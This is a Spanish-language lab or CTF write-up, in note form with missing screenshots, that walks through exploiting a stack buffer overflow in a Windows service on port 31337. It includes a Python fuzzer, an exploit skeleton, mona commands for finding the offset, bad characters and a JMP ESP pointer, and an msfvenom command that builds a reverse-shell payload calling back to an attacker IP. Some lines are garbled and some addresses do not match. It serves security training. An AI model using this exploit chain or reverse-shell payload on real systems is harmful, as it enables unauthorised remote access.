Hacemos el escaneo de nmap:
![[Pasted image 20240411142947.png]]
![[Pasted image 20240411142957.png]]
Si enumeramos el puerto 445 en busca de recursos compartidos, nos encontramos con Users:
![[Pasted image 20240411143200.png]]
Entramos dentro y nos encontramos con el siguiente binario:
```bash
smbclient //10.10.181.112/Users -N
```
![[Pasted image 20240411143305.png]]
Y vemos que este binario está funcionando bajo el puerto 31337:
```bash
telnet 10.10.227.255 31337
```
![[Pasted image 20240411143517.png]]
Si probamos en enviar una cantidad grande de información, el servicio crashea:
![[Pasted image 20240411143611.png]]
Cargamos este ejecutable en el inmunity debugger:
![[Pasted image 20240411145303.png]]
Y ahora se encuentra accesible desde mi máquina atacante:
![[Pasted image 20240411150801.png]]
Por tanto creamos nuestro fuzzer con python para saber exactamente con cuantos bytes crashea el programa:
```python
#!/usr/bin/env python3
  
import socket, time, sys

ip = "192.168.0.32"  
port = 31337
timeout = 1
prefix = ""
  
string = prefix + "A" * 100
  
while True:
   try:
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
       s.settimeout(timeout)
       s.connect((ip, port))
       s.recv(1024)
       print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
       s.send(bytes(string, "latin-1"))
       s.recv(1024)
   except:
     print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
     sys.exit(0)
   string += 100 * "A"
   time.sleep(1)
```
Vemos que crashea a los 100 bytes, aunque de todos modos en esta máquina se trata de un bug, y la cifra real podrían ser 1000 caracteres, por lo que interpretaremos que se trata de 1000 caracteres:

![[Pasted image 20240411145512.png]]
Entonces ahora llegados a este punto, podemos crear un exploit.py, donde le añadiremos unos 1000 bytes para crashear el programa dentro de la variable de payload:
mado pattern_create.rb donde insertaremos los 1000 bytes:
```python
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
```
![[Pasted image 20231201100104.png]]
Y ahora esta data la vamos a pegar dentro de la variable Payload del script de python mostrado anteriormente:
![[Pasted image 20240411150916.png]]
```bash
import socket

ip = "192.168.0.32"
port = 31337

prefix = ""
offset = 0
overflow = "A" * offset
retn = ""   
padding = ""
payload = ""
postfix = ""

#\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x2>

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```
Lo ejecutamos:
![[Pasted image 20240411150819.png]]
Y el programa crashea:
![[Pasted image 20240411150832.png]]
Ahora debemos de obtener el offset utilizando el inmunity debugger, por lo que insertamos el siguiente comando:
```bash
!mona findmsp -distance 1000
```
Y debemos fijarnos en donde pone EIP y offset 146:
![[Pasted image 20240411151026.png]]
Es decir, necesitamos enviar 146 caracteres para llegar al momento exacto donde inicia el EIP. Ahora colocamos “BBBB” en la variable **retn** para corroborar que podamos sobreescribir el registro EIP, ya habiendo colocado el offset correcto en el script. Como se observa, esto es posible (EIP vale 42424242):
![[Pasted image 20240411151416.png]]
Lanzamos el script y vemos que podemos sobreescribir el EIP:
![[Pasted image 20240411151510.png]]
![[Pasted image 20240411151501.png]]
## BAD CHARS
El siguiente paso será obtener los bad chars, lo cual consiste en que para ciertos servicios existen algunos caracteres que no se aceptan, provocando una ejecución errónea cuando generamos la shellcode. Estos caracteres se denomina bad character y debemos de eliminarlos de nuestro exploit.

------------------------------

Para testearlo, vamos a instalar la librería badchars de python:
![[Pasted image 20230906194513.png]]
Y con este comando generamos las badchars totales:
![[Pasted image 20230906194536.png]]
Y añadimos esto dentro de nuesto script de python en la variable payload:
![[Pasted image 20230906195052.png]]
Y ahora vamos ejecutar el siguiente comando en el Immunity !mona bytearray -b "\x00" para que tenga un archivo con el que comparar el de la aplicación, y si hay algún bad char nos lo llegaría a mostrar:
```bash
!mona bytearray -b "\x00"
```
![[Pasted image 20231201102116.png]]
Reiniciamos el binario en el inmmunity debugger:
![[Pasted image 20231130152020.png]]
Lanzamos nuevamente el exploit y nos fijamos en el número ESP:
![[Pasted image 20231201102609.png]]
![[Pasted image 20240411153948.png]]
Obtenemos el número 00A719E8, por tanto ahora debemos ejecutar el siguiente comando para comprobar la existencia de bad characters:
```bash
!mona compare -f bytearray.bin -a 0019FF78
```
![[Pasted image 20240411154129.png]]
Y nos encontramos con el default \x00 y el \x0a:
![[Pasted image 20240411154201.png]]
Eliminamos el badchar del script:
![[Pasted image 20240411154532.png]]
Eliminado:
![[Pasted image 20240411154553.png]]
Ahora arrancamos otra vez el ejecutable:
![[Pasted image 20240411154631.png]]
Lanzamos el exploit:
![[Pasted image 20231201102609.png]]
Nos fijamos en el nuevo ESP:
![[Pasted image 20240411155350.png]]
Y ejecutamos este comando con el nuevo ESP tras ejecutar el script sin los bad chars:
```bash
!mona compare -f bytearray.bin -a 007F19E8
```
Y ahora el script está correcto, ya hemos eliminado todos los bad chars:
![[Pasted image 20240411155429.png]]
## POINTER
Ahora tenemos que darle un punto de salto donde ejecutar, con este comando estaríamos buscando las instrucciones de "jmp esp". Por lo que ejecutamos el siguiente comando, con los badchars que nos haya aparecido anteriormente, en nuestro es el x00 y x0a:
```bash
!mona jmp -r esp -cpb "\x00\x0a"
```
Y se nos muestran dos pointers, los cuales son:
```bash
0x080414c3
0x080416bf
```
![[Pasted image 20240411155605.png]]
En este punto, debemos utilizar la primera de las líneas:
```bash
0x080414c3
```
Y convertir esto en esta forma:
```bash
\xc3\x14\x04\x08
```
Lo pegamos en el script, además de añadir x90 * 16 en el padding:
![[Pasted image 20240411160223.png]]
Y ahora solo nos queda generar el shellcode para pegarlo dentro de la variable payload, donde vamos a crearlo usando msfvenom y añadiendo los bad chars que habíamos encontrado antes:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.8.60.92 LPORT=443 EXITFUNC=thread -b "\x00\x0a" -f c
```
![[Pasted image 20240411160522.png]]
Pegamos este resultado en la variable payload del exploit.py:
![[Pasted image 20240411160621.png]]
Corregimos el puerto y la IP:
![[Pasted image 20240411160712.png]]
Volvemos a ejecutar el exploit:
![[Pasted image 20240411160752.png]]
Y recibimos la conexión:
![[Pasted image 20240411160802.png]]
